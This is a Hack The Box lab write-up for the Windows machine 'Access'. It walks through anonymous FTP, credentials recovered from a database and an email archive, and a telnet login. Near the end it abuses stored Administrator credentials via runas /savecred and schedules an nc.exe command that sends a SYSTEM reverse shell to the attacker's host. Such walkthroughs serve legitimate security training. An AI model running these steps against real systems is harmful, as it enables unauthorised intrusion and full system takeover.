# Hack The Box — Access

Difficulty: Easy

OS: Windows

Target IP: 10.129.40.136

## 1. Reconnaissance

### Port Scan

First, I performed a port scan using `rustscan`.

```bash
rustscan -a 10.129.40.136 -- -sV -sC -oN nmap
```

**Results:**

```text
21/tcp open  ftp     Microsoft ftpd (Anonymous FTP login allowed)
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
```

Anonymous FTP login was allowed, so firstly I decided to inspect FTP. 

## 2. FTP Enumeration

### Anonymous Login

I connected to the FTP service.

```bash
ftp 10.129.40.136
```

```text
Name: Anonymous
Password: (press Enter)
```

The following directories were found:

```text
ftp> ls

08-23-18  09:16PM                 Backups
08-24-18  10:00PM                 Engineer
```

### Downloading Files

```text
ftp> cd Backups
ftp> mget backup.mdb

ftp> cd ../Engineer
ftp> mget "Access Control.zip"
```

**Downloaded files:**

* `backup.mdb` — Microsoft Access database
* `Access Control.zip` — Password-protected ZIP archive

## 3. Analyzing `backup.mdb`

### Searching the Database

```bash
strings backup.mdb | grep -i "pass|user|access"
```

<img width="492" height="392" alt="image" src="https://github.com/user-attachments/assets/e98aa6b0-643a-4763-a1ed-cdaf03c93c64" />

This revealed the following credential:

```text
access4u@security
```

This turned out to be the password for `Access Control.zip`.

## 4. Extracting `Access Control.zip`

### Using 7z

```bash
sudo apt install p7zip-full
7z x "Access Control.zip"
```

```text
# Enter password: access4u@security
```

output
```bash
└─$ 7z x "Access Control.zip"


7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

The archive contained:

* `Access Control.pst` — Outlook email file

## 5. Analyzing the PST File

### Installing pst-utils

```bash
sudo apt install pst-utils
```

### Extracting the PST as mbox

```bash
mkdir -p pst_output
readpst -o pst_output "Access Control.pst"
```

### Reviewing the Email

```bash
cat pst_output/"Access Control.mbox"
```

An important email was found:

```text
From: john@megacorp.com

Subject: MegaCorp Access Control System "security" account

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.

Please ensure this is passed on to your engineers.
```

**Obtained credentials:**

| Item         | Value              |
| ------------ | ------------------ |
| **Username** | `security`         |
| **Password** | `4Cc3ssC0ntr0ller` |

## 6. Logging in via Telnet

```bash
telnet 10.129.40.136 23
```

```text
login: security
password: 4Cc3ssC0ntr0ller
```

I obtained a shell as the `security` user.

<img width="557" height="237" alt="image" src="https://github.com/user-attachments/assets/0b09e908-273e-478a-b904-3b23cf4ec391" />

### User Flag

```cmd
type C:\Users\security\Desktop\user.txt
```

## 7. Privilege Escalation

### Checking Stored Credentials

I checked the credentials stored in Windows Credential Manager.

```cmd
cmdkey /list
```

**Output:**

<img width="636" height="222" alt="image" src="https://github.com/user-attachments/assets/0209f031-5603-4a87-bed3-201d99c610e5" />

The credentials for `ACCESS\Administrator` were stored on the system.

### Why `runas /savecred` Works

`runas /savecred` can reuse credentials stored in Windows Credential Manager.

* Normally, `runas` prompts for a password.
* With `/savecred`, previously stored credentials can be reused automatically.
* This allows the `security` user to execute commands as `Administrator` without entering the password again.

**The underlying security issue is the misconfiguration itself:**

> Administrator credentials should not be stored in a way that allows a normal user such as `security` to reuse them.

### Obtaining the Root Flag

The root flag could be retrieved directly using the stored Administrator credentials:

```cmd
runas /savecred /user:ACCESS\Administrator "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"

type C:\Users\security\Desktop\root.txt
```

At this point, the root flag had already been obtained.

### SYSTEM Shell via Scheduled Task

Since the Administrator account can be used to execute commands, the next step is to obtain a reverse shell with SYSTEM privileges.

For this, I used schtasks to create a Scheduled Task.

A Scheduled Task can run as a specified user and execute as an independent process. This allows nc.exe to run with SYSTEM privileges without depending on the temporary execution context created by runas.

**1. Create the Scheduled Task**

The following command creates a task that executes nc.exe as SYSTEM.

```bash
runas /savecred /user:ACCESS\Administrator "schtasks /create /tn rev /tr "C:\Users\security\Desktop\nc.exe 10.10.15.167 4444 -e cmd.exe" /sc once /st 00:00 /ru SYSTEM"
```

/ru SYSTEM → Run the task as SYSTEM
/sc once /st 00:00 → Create a one-time task that can be triggered manually later

**2. Run the Task**

Run the newly created task manually.

runas /savecred /user:ACCESS\Administrator "schtasks /run /tn rev"

**3. Start the Listener**

Start a listener on the attacking machine.

nc -lvnp 4444

The reverse shell was successfully received.

<img width="517" height="150" alt="image" src="https://github.com/user-attachments/assets/fc36f4c4-0ab2-418d-a628-4a93bc2dbe76" />

SYSTEM privileges were successfully obtained.
